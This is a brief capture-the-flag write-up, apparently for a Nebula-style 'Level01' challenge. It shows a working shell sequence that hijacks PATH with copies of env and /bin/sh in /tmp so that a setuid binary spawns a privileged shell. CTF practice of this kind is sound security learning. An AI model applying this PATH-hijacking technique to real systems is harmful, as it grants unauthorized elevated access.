# Level01

This method I came up with just makes an "env chain" until we call `what?` which spawns a shell.
Another way to do this would be to make a custom echo script that just spawns a shell, but I think this way is more fun.

```bash
cd /home/flag01
cp /usr/bin/env /tmp/echo
cp /usr/bin/env /tmp/and
cp /usr/bin/env /tmp/now
cp /bin/sh /tmp/what?
export PATH=/tmp:$PATH
./flag01
getflag
```
